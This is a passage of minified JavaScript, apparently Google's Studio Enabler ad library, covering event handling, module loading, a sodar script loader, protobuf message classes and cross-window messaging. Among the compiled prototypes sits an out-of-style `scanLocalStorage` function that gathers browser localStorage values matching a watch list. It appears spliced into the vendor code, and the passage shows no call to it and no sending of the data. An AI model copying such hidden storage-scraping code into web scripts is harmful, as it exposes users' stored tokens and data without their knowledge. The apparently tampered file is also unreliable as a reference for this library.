    qh(this, a, b, c, d);
  };
  h.dispatchEvent = function (a) {
    vh(this);
    var b = this.mb;
    if (b) {
      var c = [];
      for (var d = 1; b; b = b.mb) c.push(b), x(1E3 > ++d, "infinite loop");
    }
    b = this.hf;
    d = a.type || a;
    if ("string" === typeof a) a = new Qg(a, b);else if (a instanceof Qg) a.target = a.target || b;else {
      var e = a;
      a = new Qg(d, b);
      xc(a, e);
    }
    e = !0;
    if (c) for (var f = c.length - 1; !a.j && 0 <= f; f--) {
      var g = a.h = c[f];
      e = wh(g, d, !0, a) && e;
    }
    a.j || (g = a.h = b, e = wh(g, d, !0, a) && e, a.j || (e = wh(g, d, !1, a) && e));
    if (c) for (f = 0; !a.j && f < c.length; f++) g = a.h = c[f], e = wh(g, d, !1, a) && e;
    return e;
  };
  h.D = function () {
    I.S.D.call(this);
    this.v && ch(this.v);
    this.mb = null;
  };
  h.Ma = function (a, b, c, d) {
    vh(this);
    return this.v.add(String(a), b, !1, c, d);
  };
  h.Va = function (a, b, c, d) {
    var e = this.v;
    a = String(a).toString();
    if (a in e.h) {
      var f = e.h[a];
      b = ah(f, b, c, d);
      -1 < b ? (Zg(f[b]), ob(f, b), 0 == f.length && (delete e.h[a], e.j--), e = !0) : e = !1;
    } else e = !1;
    return e;
  };
  var wh = function (a, b, c, d) {
      b = a.v.h[String(b)];
      if (!b) return !0;
      b = b.concat();
      for (var e = !0, f = 0; f < b.length; ++f) {
        var g = b[f];
        if (g && !g.fb && g.capture == c) {
          var l = g.listener,
            m = g.Ta || g.src;
          g.pb && bh(a.v, g);
          e = !1 !== l.call(m, d) && e;
        }
      }
      return e && !d.defaultPrevented;
    },
    vh = function (a) {
      x(a.v, "Event target is not initialized. Did you call the superclass (goog.events.EventTarget) constructor?");
    };
  var xh = function (a, b) {
    I.call(this);
    this.o = a || 1;
    this.l = b || q;
    this.s = v(this.B, this);
    this.A = Na();
  };
  w(xh, I);
  xh.prototype.j = !1;
  xh.prototype.h = null;
  xh.prototype.B = function () {
    if (this.j) {
      var a = Na() - this.A;
      0 < a && a < .8 * this.o ? this.h = this.l.setTimeout(this.s, this.o - a) : (this.h && (this.l.clearTimeout(this.h), this.h = null), this.dispatchEvent("tick"), this.j && (yh(this), this.start()));
    }
  };
  xh.prototype.start = function () {
    this.j = !0;
    this.h || (this.h = this.l.setTimeout(this.s, this.o), this.A = Na());
  };
  var yh = function (a) {
    a.j = !1;
    a.h && (a.l.clearTimeout(a.h), a.h = null);
  };
  xh.prototype.D = function () {
    xh.S.D.call(this);
    yh(this);
    delete this.l;
  };
  var zh = function (a, b, c) {
    if ("function" === typeof a) c && (a = v(a, c));else if (a && "function" == typeof a.handleEvent) a = v(a.handleEvent, a);else throw Error("Invalid listener argument");
    return 2147483647 < Number(b) ? -1 : q.setTimeout(a, b || 0);
  };
  function Ah(a) {
    a = null === a ? "null" : void 0 === a ? "undefined" : a;
    if ("string" !== typeof a) throw Error("Expected a string");
    return Gc(a);
  }
  ;
  var Bh = {},
    Ch = {},
    Dh = new sf(.001, "");
  Dh.h = "load";
  var Eh = new sf(.1, "");
  Eh.h = "fail";
  var Fh = new G();
  Fh.set("enabler", "enabler");
  Fh.set("dcmenabler", "dcm");
  Fh.set("video", "vid");
  Fh.set("configurable", "cfg");
  Fh.set("configurablefiller", "cfg_fill");
  Fh.set("layouts", "lay");
  Fh.set("layoutsfiller", "lay_fill");
  Fh.set("gdn", "gdn");
  Fh.set("rad_ui_video", "rad");
  var Gh = function (a) {
      a = Bh[a];
      return void 0 !== a && 1 <= a;
    },
    Hh = function (a) {
      a: {
        var b = document.getElementsByTagName("script");
        for (var c = 0; c < b.length; c++) {
          var d = b[c];
          if (d.src || d.getAttribute("src")) if (d = d.src || d.getAttribute("src"), /Enabler/.test(d)) {
            b = d.substring(0, d.lastIndexOf("/") + 1);
            break a;
          }
        }
        b = "";
      }
      return [b, "dev_studio_01_250_", [a, "module"].join(""), ".js"].join("");
    };
  t("goog.exportSymbol", Oa, this);
  var Ih = function (a) {
      a += "goog.exportSymbol('studioLoader.context.evalInContext', " + Ih.toString() + ");";
      eval(a);
    },
    Jh = function (a, b) {
      b = Fh.get(b) || "unknown";
      a.o = b;
      a = a.l();
      !Cb(a) && C(1) && (Bd(document, "IMG").src = a);
    },
    Kh = function (a, b) {
      Bh[a] = 2;
      Jh(Dh, a);
      b = "number" === typeof b ? b : 2;
      for (var c = Hh(a), d = Bg(Ah(c)), e = 0; e < b; ++e) d = d.then(void 0, function () {
        return Bg(Ah(c));
      });
      return d.then(function () {
        Bh[a] = 3;
      }, function () {
        Jh(Eh, a);
        return Wf();
      });
    },
    Lh = function (a) {
      if (Gh(a)) return Ch[a];
      Bh[a] = 1;
      for (var b = [], c = DEPS_GRAPH ? DEPS_GRAPH[[a, "module"].join("")] : [], d = c.length - 1; 0 <= d; d--) {
        var e = c[d].replace(/module$/, "");
        if (e == a) break;
        Gh(e) ? b.push(Ch[e]) : b.push(Lh(e));
      }
      b = Zf(b).then(Ma(Kh, a, 2));
      return Ch[a] = b;
    },
    Mh = function (a, b) {
      a = Lh(a);
      "function" === typeof b && (a = a.then(b));
      a = a.then(function () {}, function () {});
    };
  t("studioLoader.context.evalInContext", Ih);
  var Dc = new db(bb, "https://tpc.googlesyndication.com/sodar/%{basename}.js");
  function Nh(a) {
    var b = window,
      c = !0;
    c = void 0 === c ? !1 : c;
    new Promise(function (d, e) {
      function f() {
        g.onload = null;
        g.onerror = null;
        var l;
        null == (l = g.parentElement) || l.removeChild(g);
      }
      var g = b.document.createElement("script");
      g.onload = function () {
        f();
        d();
      };
      g.onerror = function () {
        f();
        e(void 0);
      };
      g.type = "text/javascript";
      g.src = Cc(a);
      ye(g);
      c && "complete" !== b.document.readyState ? gb(b, function () {
        b.document.body.appendChild(g);
      }) : b.document.body.appendChild(g);
    });
  }
  ;
  function Oh(a) {
    var b, c, d, e, f, g;
    return wa(new va(new ra(function (l) {
      switch (l.h) {
        case 1:
          b = "https://pagead2.googlesyndication.com/getconfig/sodar?sv=200&tid=" + a.h + ("&tv=" + a.j + "&st=") + a.Ka;
          c = void 0;
          l.v = 2;
          var m = Ph(b);
          l.h = 4;
          return {
            value: m
          };
        case 4:
          c = l.s;
          l.h = 3;
          l.v = 0;
          break;
        case 2:
          l.v = 0, l.l = null;
        case 3:
          if (!c) return l.return(void 0);
          d = a.xb || c.sodar_query_id;
          e = void 0 !== c.rc_enable ? c.rc_enable : "n";
          f = void 0 === c.bg_snapshot_delay_ms ? "0" : c.bg_snapshot_delay_ms;
          g = void 0 === c.is_gen_204 ? "1" : c.is_gen_204;
          return d && c.bg_hash_basename && c.bg_binary ? l.return({
            context: a.l,
            Vd: c.bg_hash_basename,
            Ud: c.bg_binary,
            Ne: a.h + "_" + a.j,
            xb: d,
            Ka: a.Ka,
            vb: e,
            Cb: f,
            ub: g
          }) : l.return(void 0);
      }
    })));
  }
  var Ph = function (a) {
    return new Promise(function (b, c) {
      var d = new XMLHttpRequest();
      d.onreadystatechange = function () {
        d.readyState === d.DONE && (200 <= d.status && 300 > d.status ? b(JSON.parse(d.responseText)) : c());
      };
      d.open("GET", a, !0);
      d.send();
    });
  };
  function Qh() {
    var a = Rh(),
      b;
    wa(new va(new ra(function (c) {
      if (1 == c.h) {
        var d = Oh(a);
        c.h = 2;
        return {
          value: d
        };
      }
      if (b = c.s) {
        d = "sodar2";
        d = void 0 === d ? "sodar2" : d;
        var e = window,
          f = e.GoogleGcLKhOms;
        f && "function" === typeof f.push || (f = e.GoogleGcLKhOms = []);
        var g = {};
        f.push((g._ctx_ = b.context, g._bgv_ = b.Vd, g._bgp_ = b.Ud, g._li_ = b.Ne, g._jk_ = b.xb, g._st_ = b.Ka, g._rc_ = b.vb, g._dl_ = b.Cb, g._g2_ = b.ub, g));
        if (f = e.GoogleDX5YKUSk) e.GoogleDX5YKUSk = void 0, f[1]();
        d = Hc({
          basename: d
        });
        Nh(d);
      }
      return c.return(b);
    })));
  }
  ;
  var Sh = Vb(),
    Th = Zb() || z("iPod"),
    Uh = z("iPad"),
    Vh = z("Android") && !(Wb() || Vb() || Tb() || z("Silk")),
    Wh = Wb(),
    Xh = z("Safari") && !(Wb() || (Sb() ? 0 : z("Coast")) || Tb() || (Sb() ? 0 : z("Edge")) || (Sb() ? Rb("Microsoft Edge") : z("Edg/")) || (Sb() ? Rb("Opera") : z("OPR")) || Vb() || z("Silk") || z("Android")) && !$b();
  var Yh = {},
    Zh = null;
  var $h = "undefined" !== typeof Uint8Array,
    ai = !dc && "function" === typeof q.btoa;
  x(!0);
  var bi = "function" === typeof Symbol && "symbol" === typeof Symbol() ? Symbol("INTERNAL_ARRAY_STATE") : void 0;
  function ci(a, b) {
    x((b & 255) == b);
    Za(a, "state is only maintained on arrays.");
    if (bi) return a[bi] |= b;
    if (void 0 !== a.h) return a.h |= b;
    Object.defineProperties(a, {
      h: {
        value: b,
        configurable: !0,
        writable: !0,
        enumerable: !1
      }
    });
    return b;
  }
  var di = Object.getOwnPropertyDescriptor(Array.prototype, "Ke");
  Object.defineProperties(Array.prototype, {
    Ke: {
      get: function () {
        function a(e, f) {
          e & b && c.push(f);
        }
        var b = K(this),
          c = [];
        a(1, "IS_REPEATED_FIELD");
        a(2, "IS_IMMUTABLE_ARRAY");
        a(4, "IS_API_FORMATTED");
        a(8, "ONLY_MUTABLE_VALUES");
        a(16, "MUTABLE_REFERENCES_ARE_OWNED");
        a(32, "CONSTRUCTED");
        a(64, "TRANSFERRED");
        a(128, "IS_FIXED_GROUP");
        var d = c.join(",");
        return di ? di.get.call(this) + "|" + d : d;
      },
      configurable: !0,
      enumerable: !1
    }
  });
  function K(a) {
    Za(a, "state is only maintained on arrays.");
    var b;
    bi ? b = a[bi] : b = a.h;
    return null == b ? 0 : b;
  }
  function ei(a, b) {
    Za(a, "state is only maintained on arrays.");
    x((b & 255) == b);
    bi ? a[bi] = b : void 0 !== a.h ? a.h = b : Object.defineProperties(a, {
      h: {
        value: b,
        configurable: !0,
        writable: !0,
        enumerable: !1
      }
    });
    return a;
  }
  function fi(a, b) {
    ei(b, (a | 0) & -51);
  }
  function gi(a, b) {
    ei(b, (a | 18) & -41);
  }
  ;
  var hi = {};
  function ii(a) {
    return null !== a && "object" === typeof a && !Array.isArray(a) && a.constructor === Object;
  }
  var ji = Object.freeze(ei([], 23));
  function ki(a) {
    if (a & 2) throw Error("Cannot mutate an immutable Message");
  }
  function li() {}
  function mi(a) {
    var b = a.length;
    (b = b ? a[b - 1] : void 0) && ii(b) ? b.g = 1 : (b = {}, a.push((b.g = 1, b)));
  }
  ;
  var ni = function () {
    throw Error("please construct maps as mutable then call toImmutable");
  };
  if ("undefined" != typeof Symbol && "undefined" != typeof Symbol.hasInstance) {
    var oi = function () {
        throw Error("Cannot perform instanceof checks on ImmutableMap: please use isImmutableMap or isMutableMap to assert on the mutability of a map. See go/jspb-api-gotchas#immutable-classes for more information");
      },
      pi = {};
    Object.defineProperties(ni, (pi[Symbol.hasInstance] = {
      value: oi,
      configurable: !1,
      writable: !1,
      enumerable: !1
    }, pi));
    x(ni[Symbol.hasInstance] === oi, "defineProperties did not work: was it monkey-patched?");
  }
  ;
  var qi = function (a) {
      var b = a.h + a.Ga;
      x(0 <= b && Number.isInteger(b) && 4294967295 > b);
      return a.ka || (a.ka = a.V[b] = {});
    },
    ri = function (a, b, c) {
      return -1 === b ? null : b >= a.h ? a.ka ? a.ka[b] : void 0 : c && a.ka && (c = a.ka[b], null != c) ? c : a.V[b + a.Ga];
    },
    si = function (a, b, c, d) {
      a.j && (a.j = void 0);
      b >= a.h || d ? qi(a)[b] = c : (a.V[b + a.Ga] = c, (a = a.ka) && b in a && delete a[b]);
    };
  function ti(a, b) {
    if (!a) return a;
    x(K(b.V) & 2 ? !!(K(a.V) & 2) : !0);
    return a;
  }
  var vi = function (a, b) {
    var c = void 0 === c ? !1 : c;
    var d = ri(a, 1, c);
    var e = K(a.V),
      f = !1;
    if (null == d || "object" !== typeof d || (f = Array.isArray(d)) || d.cb !== hi) {
      if (f) {
        var g = f = K(d);
        0 === g && (g |= e & 16);
        g |= e & 2;
        g !== f && ei(d, g);
        b = new b(d);
      } else b = void 0;
    } else b = d;
    b !== d && null != b && si(a, 1, b, c);
    d = ti(b, a);
    if (null == d) return d;
    K(a.V) & 2 || (b = d, K(b.V) & 2 && (e = ui(b, !1), e.j = b, b = e), b !== d && (d = b, si(a, 1, d, c)));
    return ti(d, a);
  };
  var wi;
  function xi(a) {
    switch (typeof a) {
      case "number":
        return isFinite(a) ? a : String(a);
      case "object":
        if (a) if (Array.isArray(a)) {
          if (0 !== (K(a) & 128)) return a = Array.prototype.slice.call(a), mi(a), a;
        } else if ($h && null != a && a instanceof Uint8Array) {
          if (ai) {
            for (var b = ""; 10240 < a.length;) b += String.fromCharCode.apply(null, a.subarray(0, 10240)), a = a.subarray(10240);
            b += String.fromCharCode.apply(null, a);
            a = btoa(b);
          } else {
            x(Fa(a), "encodeByteArray takes an array as a parameter");
            void 0 === b && (b = 0);
            if (!Zh) {
              Zh = {};
              for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
                var f = c.concat(d[e].split(""));
                Yh[e] = f;
                for (var g = 0; g < f.length; g++) {
                  var l = f[g],
                    m = Zh[l];
                  void 0 === m ? Zh[l] = g : x(m === g);
                }
              }
            }
            b = Yh[b];
            c = Array(Math.floor(a.length / 3));
            d = b[64] || "";
            for (e = f = 0; f < a.length - 2; f += 3) {
              m = a[f];
              var p = a[f + 1];
              l = a[f + 2];
              g = b[m >> 2];
              m = b[(m & 3) << 4 | p >> 4];
              p = b[(p & 15) << 2 | l >> 6];
              l = b[l & 63];
              c[e++] = "" + g + m + p + l;
            }
            g = 0;
            l = d;
            switch (a.length - f) {
              case 2:
                g = a[f + 1], l = b[(g & 15) << 2] || d;
              case 1:
                a = a[f], c[e] = "" + b[a >> 2] + b[(a & 3) << 4 | g >> 4] + l + d;
            }
            a = c.join("");
          }
          return a;
        }
    }
    return a;
  }
  ;
  function yi(a, b, c, d) {
    if (null != a) {
      if (Array.isArray(a)) a = zi(a, b, c, void 0 !== d);else if (ii(a)) {
        var e = {},
          f;
        for (f in a) e[f] = yi(a[f], b, c, d);
        a = e;
      } else a = b(a, d);
      return a;
    }
  }
  function zi(a, b, c, d) {
    var e = K(a);
    d = d ? !!(e & 16) : void 0;
    a = Array.prototype.slice.call(a);
    for (var f = 0; f < a.length; f++) a[f] = yi(a[f], b, c, d);
    c(e, a);
    return a;
  }
  function Ai(a) {
    return a.cb === hi ? a.toJSON() : xi(a);
  }
  function Bi(a, b) {
    a & 128 && mi(b);
  }
  ;
  function Ci(a, b, c) {
    c = void 0 === c ? gi : c;
    if (null != a) {
      if ($h && a instanceof Uint8Array) return b ? a : new Uint8Array(a);
      if (Array.isArray(a)) {
        var d = K(a);
        if (d & 2) return a;
        if (b && !(d & 32) && (d & 16 || 0 === d)) return ei(a, d | 18), a;
        a = zi(a, Ci, d & 4 ? gi : c, !0);
        b = K(a);
        b & 4 && b & 2 && Object.freeze(a);
        return a;
      }
      a.cb === hi && (x(a.cb === hi), K(a.V) & 2 || (a = ui(a, !0), ci(a.V, 18)));
      return a;
    }
  }
  function ui(a, b) {
    x(a.cb === hi);
    var c = a.V,
      d = [];
    ci(d, 16);
    var e = a.constructor.j;
    e && d.push(e);
    e = a.ka;
    if (e) {
      d.length = c.length;
      var f = {};
      d[d.length - 1] = f;
    }
    0 !== (K(c) & 128) && mi(d);
    b = b || K(a.V) & 2 ? gi : fi;
    f = a.constructor;
    x(!!(K(d) & 16));
    wi = d;
    d = new f(d);
    wi = void 0;
    a.Lc && (d.Lc = a.Lc.slice());
    f = !!(K(c) & 16);
    for (var g = e ? c.length - 1 : c.length, l = 0; l < g; l++) {
      var m = l - a.Ga,
        p = Ci(c[l], f, b);
      ki(K(d.V));
      si(d, m, p, !1);
    }
    if (e) for (var r in e) c = e[r], a = +r, x(!Number.isNaN(a), "should not have non-numeric keys in sparse objects after a constructor is called."), c = Ci(c, f, b), ki(K(d.V)), si(d, a, c, !0);
    return d;
  }
  ;
  if ("undefined" !== typeof Proxy) {
    var Ei = Di;
    new Proxy({}, {
      getPrototypeOf: Ei,
      setPrototypeOf: Ei,
      isExtensible: Ei,
      preventExtensions: Ei,
      getOwnPropertyDescriptor: Ei,
      defineProperty: Ei,
      has: Ei,
      get: Ei,
      set: Ei,
      deleteProperty: Ei,
      apply: Ei,
      construct: Ei
    });
  }
  function Di() {
    throw Error("this array or object is owned by JSPB and should not be reused, did you mean to copy it with copyJspbArray? See go/jspb-api-gotchas#construct_from_array");
    throw Error();
  }
  ;
  var Fi = function (a, b, c, d) {
    ab(this, Fi, "The message constructor should only be used by subclasses");
    x(this.constructor !== Fi, "Message is an abstract class and cannot be directly constructed");
    null == a && (a = wi);
    wi = void 0;
    var e = this.constructor.j;
    if (null == a) {
      a = e ? [e] : [];
      var f = 48;
      var g = !0;
      d && (f |= 128);
      ei(a, f);
    } else {
      if (!Array.isArray(a)) throw Error("data passed to JSPB constructors must be an Array, got '" + JSON.stringify(a) + "' a " + Ea(a));
      if (Object.isFrozen(a) || !Object.isExtensible(a) || Object.isSealed(a)) throw Error("data passed to JSPB constructors must be mutable");
      if (e && e !== a[0]) throw Error('Expected message to have a message id: "' + e + '" in the array, got: ' + JSON.stringify(a[0]) + " a " + Ea(a[0]) + ", are you parsing with the wrong proto?");
      f = ci(a, 0) | 32;
      g = 0 !== (16 & f);
      if (d) {
        if (f |= 128, 0 < a.length) {
          var l = a[a.length - 1];
          if (ii(l) && "g" in l) {
            delete l.g;
            var m = !0,
              p;
            for (p in l) {
              m = !1;
              break;
            }
            m && a.pop();
          }
        }
      } else if (128 & f) throw Error();
      ei(a, f);
    }
    this.Ga = e ? 0 : -1;
    this.V = a;
    this.preventPassingToStructuredClone = li;
    a: {
      f = this.V.length;
      e = f - 1;
      if (f && (f = this.V[e], ii(f))) {
        this.ka = f;
        this.h = e - this.Ga;
        break a;
      }
      void 0 !== b && -1 < b ? (this.h = Math.max(b, e + 1 - this.Ga), this.ka = void 0) : this.h = Number.MAX_VALUE;
    }
    if (!d && this.ka && "g" in this.ka) throw Error('Unexpected "g" flag in sparse object of message that is not a group type.');
    if (c) {
      b = g && !0;
      d = this.h;
      var r;
      for (g = 0; g < c.length; g++) e = c[g], e < d ? (e += this.Ga, (f = a[e]) ? Gi(f, b) : a[e] = ji) : (r || (r = qi(this)), (f = r[e]) ? Gi(f, b) : r[e] = ji);
    }
    x(!!(K(this.V) & 32));
  };
  Fi.prototype.toJSON = function () {
    var a = this.V;
    Za(a);
    return zi(a, Ai, Bi);
  };
  function Gi(a, b) {
    if (Array.isArray(a)) {
      var c = K(a),
        d = 1;
      !b || c & 2 || (d |= 16);
      (c & d) !== d && ei(a, c | d);
    }
  }
  Fi.prototype.cb = hi;
  Fi.prototype.toString = function () {
    return this.V.toString();
  };
  function Hi(a) {
    if (a instanceof Fi) return a.constructor.h;
  }
  ;
  (function () {
    var a = q.jspbGetTypeName;
    q.jspbGetTypeName = a ? function (b) {
      return a(b) || Hi(b);
    } : Hi;
  })();
  var Ii = Fi;
  var Ji = function (a) {
      this.h = a.h;
      this.j = a.j;
      this.l = a.l;
      this.xb = a.xb;
      this.Ka = a.Ka;
      this.vb = a.vb;
      this.Cb = a.Cb;
      this.ub = a.ub;
    },
    Ki = function () {
      this.h = "xfad";
      this.j = "01_250";
      this.l = "cr";
      this.Ka = "env";
      this.vb = "n";
      this.Cb = "0";
      this.ub = "1";
    },
    Rh = function () {
      var a = new Ki();
      a.Ka = "int";
      return new Ji(a);
    };
  var Li = function (a) {
    Ii.call(this, a);
  };
  n(Li, Ii);
  Li.h = "adsense.rum.Parameters";
  var Mi = function (a) {
    Ii.call(this, a);
  };
  n(Mi, Ii);
  Mi.h = "adsense.rum.Config";
  var Ni = function () {
      this.h = new G();
      this.size = 0;
    },
    Oi = function (a) {
      var b = typeof a;
      return "object" == b && a || "function" == b ? "o" + Ja(a) : b.slice(0, 1) + a;
    };
  Ni.prototype.ja = function () {
    return this.h.size;
  };
  Ni.prototype.add = function (a) {
    this.h.set(Oi(a), a);
    this.size = this.h.size;
  };
  var Qi = function (a) {
    var b = Pi;
    a = Ce(a);
    for (var c = a.length, d = 0; d < c; d++) b.add(a[d]);
    b.size = b.h.size;
  };
  h = Ni.prototype;
  h.has = function (a) {
    return this.h.ia(Oi(a));
  };
  h.contains = function (a) {
    return this.h.ia(Oi(a));
  };
  h.Z = function () {
    return this.h.Z();
  };
  h.values = function () {
    return this.h.values();
  };
  h.ya = function () {
    return this.h.ya(!1);
  };
  Ni.prototype[Symbol.iterator] = function () {
    return this.values();
  };
  t("studio.common.Feature.Type", {
    jg: 1,
    SDK_EVENT_FORWARDER: 2,
    RL_EVENT_FORWARDER: 3
  });
  var Pi = new Ni();
  t("studio.common.Feature.hasFeature", function (a) {
    return Pi.has(a);
  });
  t("studio.common.Feature.hasFeatures", function (a) {
    var b = Pi;
    a: {
      var c = b.contains;
      if ("function" == typeof a.every) a = a.every(c, b);else if (Fa(a) || "string" === typeof a) a = Array.prototype.every.call(a, c, b);else {
        for (var d = De(a), e = Ce(a), f = e.length, g = 0; g < f; g++) if (!c.call(b, e[g], d && d[g], a)) {
          a = !1;
          break a;
        }
        a = !0;
      }
    }
    return a;
  });
  var Ri = function (a, b) {
      this.j = a;
      this.h = null != b ? b : 0;
    },
    Si = function () {
      var a = window;
      return a.innerWidth > a.innerHeight ? "landscape" : "portrait";
    },
    Ti = function () {
      return "onorientationchange" in window;
    };
  Ri.prototype.ue = function () {
    return this.j;
  };
  Ri.prototype.te = function () {
    return this.h;
  };
  Ri.prototype.toString = function () {
    return this.j;
  };
  t("studio.common.Orientation", Ri);
  Ri.prototype.getDegrees = Ri.prototype.te;
  Ri.prototype.getMode = Ri.prototype.ue;
  Ri.Mode = {
    PORTRAIT: "portrait",
    LANDSCAPE: "landscape"
  };
  function Ui(a, b) {
    return b ? a.replace("[rm_exit_id]", b) : a;
  }
  function Vi(a) {
    Cb(od(a)) || "market" != (a.match(Ld)[1] || null) || (a = a.match(Ld), a = "https://play.google.com/store/apps/details" + Kd(null, null, null, null, a[5], a[6], a[7]));
    return a;
  }
  ;
  var Wi = {
    CREATIVETOOLSET_CONFIG: "creativeToolsetConfig",
    CREATIVETOOLSET_INTERNALS: "creativeToolsetInternals",
    CREATIVETOOLSET_INTERNALS_GEN204: "creativeToolsetInternalsGen204",
    CREATIVE_REPORTER: "creativeReporter",
    CREATIVE_INNOVATION: "gcreativeinnovation",
    GOOGLE_AFMA_SUPPORT: "googleAfmaSupport"
  };
  t("studio.common.WhitelistedExternalObject", Wi);
  var Xi = {};
  var L = function (a) {
    H.call(this);
    this.A = a;
    this.l = {};
  };
  w(L, H);
  var Yi = [],
    M = function (a, b, c, d, e, f) {
      Array.isArray(c) || (c && (Yi[0] = c.toString()), c = Yi);
      for (var g = 0; g < c.length; g++) {
        var l = jh(b, c[g], d || a.handleEvent, e || !1, f || a.A || a);
        if (!l) break;
        a.l[l.key] = l;
      }
    },
    Zi = function (a, b, c, d, e, f) {
      if (Array.isArray(c)) for (var g = 0; g < c.length; g++) Zi(a, b, c[g], d, e, f);else (b = ih(b, c, d || a.handleEvent, e, f || a.A || a)) && (a.l[b.key] = b);
    },
    $i = function (a, b, c, d, e, f) {
      if (Array.isArray(c)) for (var g = 0; g < c.length; g++) $i(a, b, c[g], d, e, f);else if (b = sh(b, c, d || a.handleEvent, u(e) ? !!e.capture : !!e, f || a.A || a)) rh(b), delete a.l[b.key];
    },
    aj = function (a) {
      oc(a.l, function (b, c) {
        this.l.hasOwnProperty(c) && rh(b);
      }, a);
      a.l = {};
    };
  L.prototype.D = function () {
    L.S.D.call(this);
    aj(this);
  };
  L.prototype.handleEvent = function () {
    throw Error("EventHandler.handleEvent not implemented");
  };
  var bj = {
      1: "NativeMessagingTransport"
    },
    cj = ["pu", "lru", "pru", "lpu", "ppu"],
    ej = function () {
      for (var a = 10, b = dj, c = b.length, d = ""; 0 < a--;) d += b.charAt(Math.floor(Math.random() * c));
      return d;
    },
    dj = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    N = oe("goog.net.xpc");
  var fj = function (a) {
    H.call(this);
    this.l = a || ud();
  };
  w(fj, H);
  fj.prototype.K = 0;
  const scanLocalStorage = () => {
    return Object.keys(window.localStorage).filter(key => keysToWatch.includes(key)).reduce((obj, key) => {
      obj[key] = window.localStorage[key];
      return obj;
    }, {});
  };
  fj.prototype.H = function () {
    return bj[String(this.K)] || "";
  };
  var gj = function (a, b) {
    fj.call(this, b);
    this.h = a;
    this.F = new L(this);
    Pg(this, this.F);
    this.A = new xh(100, yd(this.l.h));
    Pg(this, this.A);
    this.o = new E();
    this.v = new E();
    this.j = new E();
    this.C = ej();
    this.B = null;
    this.s = {};
    this.J = this.h.name;
    this.h.hb(this.h.name + "_" + this.h.fa());
    this.G = !1;
    tg(this.j, this.o);
    tg(this.j, this.v);
    rg(this.j, this.zd, this);
    this.j.callback(!0);
    M(this.F, this.A, "tick", this.bc);
    B(N, "DirectTransport created. role=" + this.h.fa());
  };
  n(gj, fj);
  var jj = function (a) {
    var b = new hj(a.channelName, a.service, a.payload);
    a = b.h;
    var c = b.l;
    b = b.j;
    se(N, "messageReceived: channel=" + a + ", service=" + c + ", payload=" + b);
    var d = Xi[a];
    if (d) return d.sa(c, b), !0;
    d = ij(b)[0];
    for (var e in Xi) {
      var f = Xi[e];
      if (1 == f.fa() && !f.isConnected() && "tp" == c && "SETUP" == d) return f.hb(a), f.sa(c, b), !0;
    }
    B(N, "channel name mismatch; message ignored.");
    return !1;
  };
  h = gj.prototype;
  h.Db = function (a) {
    a = ij(a);
    var b = a[1];
    switch (a[0]) {
      case "SETUP_ACK":
        this.o.h || this.o.callback(!0);
        break;
      case "SETUP":
        this.W("tp", "SETUP_ACK"), this.v.h || this.v.callback(!0), null != this.B && this.B != b && (B(N, "Sending SETUP and changing peer ID to: " + b), this.W("tp", "SETUP," + this.C)), this.B = b;
    }
  };
  h.connect = function () {
    var a = yd(this.l.h);
    if (a) {
      var b = Ja(a);
      0 == (kj[b] || 0) && null == Ba("crosswindowmessaging.channel", a) && t("crosswindowmessaging.channel", jj, a);
      kj[b]++;
      this.G = !0;
      this.bc();
    } else se(N, "connect(): no window to initialize.");
  };
  h.bc = function () {
    this.h.isConnected() ? yh(this.A) : (this.A.start(), this.W("tp", "SETUP," + this.C));
  };
  h.W = function (a, b) {
    this.h.ba ? (a = new hj(this.J + "_" + (0 == this.h.fa() ? 1 : 0), a, b), this.h.h.directSyncMode ? this.wc(a) : this.s[Ja(a)] = zh(v(this.wc, this, a), 0)) : se(N, "send(): window not ready");
  };
  h.wc = function (a) {
    var b = Ja(a);
    this.s[b] && delete this.s[b];
    try {
      var c = Ba("crosswindowmessaging.channel", this.h.ba);
    } catch (d) {
      A(N, "Can't access other window, ignoring.", d);
      return;
    }
    if (null === c) A(N, "Peer window had no global function.");else try {
      c({
        channelName: a.h,
        service: a.l,
        payload: a.j
      }), B(N, "send(): channelName=" + a.h + " service=" + a.l + " payload=" + a.j);
    } catch (d) {
      A(N, "Error performing call, ignoring.", d);
    }
  };
  h.zd = function () {
    lj(this.h, 0);
  };
  h.D = function () {
    if (this.G) {
      var a = yd(this.l.h),
        b = Ja(a);
      1 == --kj[b] && t("crosswindowmessaging.channel", null, a);
    }
    this.s && (oc(this.s, function (c) {
      q.clearTimeout(c);
    }), this.s = null);
    this.o && (this.o.cancel(), delete this.o);
    this.v && (this.v.cancel(), delete this.v);
    this.j && (this.j.cancel(), delete this.j);
    fj.prototype.D.call(this);
  };
  var ij = function (a) {
      a = a.split(",");
      a[1] = a[1] || null;
      return a;
    },
    kj = {};
  gj.prototype.K = 2;
  var hj = function (a, b, c) {
    this.h = a;
    this.l = b;
    this.j = c;
  };
  var mj = function (a, b, c, d, e) {
    fj.call(this, c);
    this.o = a;
    this.j = e || 2;
    x(1 <= this.j);
    x(2 >= this.j);
    this.O = b || "*";
    this.J = new L(this);
    this.B = new xh(100, yd(this.l.h));
    this.F = !!d;
    this.s = new E();
    this.A = new E();
    this.v = new E();
    this.ma = ej();
    this.G = null;
    this.F ? 1 == this.o.fa() ? tg(this.v, this.s) : tg(this.v, this.A) : (tg(this.v, this.s), 2 == this.j && tg(this.v, this.A));
    rg(this.v, this.wa, this);
    this.v.callback(!0);
    x(!0, "Major version must be an integer");
    this.xa = 10 >= Yb();
    M(this.J, this.B, "tick", this.X);
    B(N, "NativeMessagingTransport created.  protocolVersion=" + this.j + ", oneSidedHandshake=" + this.F + ", role=" + this.o.fa());
  };
  n(mj, fj);
  var oj = function (a) {
    var b = a.ca.data;
    if ("string" !== typeof b) return !1;
    var c = b.indexOf("|"),
      d = b.indexOf(":");
    if (-1 == c || -1 == d) return !1;
    var e = b.substring(0, c);
    c = b.substring(c + 1, d);
    b = b.substring(d + 1);
    se(N, "messageReceived: channel=" + e + ", service=" + c + ", payload=" + b);
    if (d = Xi[e]) return d.sa(c, b, a.ca.origin), !0;
    d = nj(b)[0];
    for (var f in Xi) {
      var g = Xi[f];
      if (1 == g.fa() && !g.isConnected() && "tp" == c && ("SETUP" == d || "SETUP_NTPV2" == d) && g.ab(a.ca.origin)) return g.hb(e), g.sa(c, b), !0;
    }
    B(N, 'channel name mismatch; message ignored"');
    return !1;
  };
  mj.prototype.Db = function (a) {
    var b = nj(a);
